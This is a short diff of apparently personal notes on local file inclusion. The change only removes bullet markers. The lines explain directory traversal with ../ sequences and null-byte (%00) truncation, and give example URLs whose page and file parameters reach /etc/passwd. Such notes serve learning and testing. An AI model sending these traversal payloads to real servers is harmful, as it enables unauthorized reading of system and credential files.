@@ -3,16 +3,16 @@
 
 web application vulnerability that allows an attacker to access files stored on the server
 
-* example - __example.com/index.php?page=etc/password__
+example - __example.com/index.php?page=etc/password__
 
-* You can move up directories with ../../../../
-* So our example would change too - example - example.com/index.php?page=./../../../etc/password
+You can move up directories with ../../../../
+So our example would change too - example - example.com/index.php?page=./../../../etc/password
 
-* .. = parent directory
-* / = directory separator
+.. = parent directory
+/ = directory separator
 
-* %00 = is a null byte, a special character that tells a computer, Stop reading here.
-* example.com/index.php?page=./../../../etc/password%00
+%00 = is a null byte, a special character that tells a computer, Stop reading here.
+example.com/index.php?page=./../../../etc/password%00
 
 * F-P-I-T-V-L
   * file - xample.com/index.php?file=../../../../etc/passwd
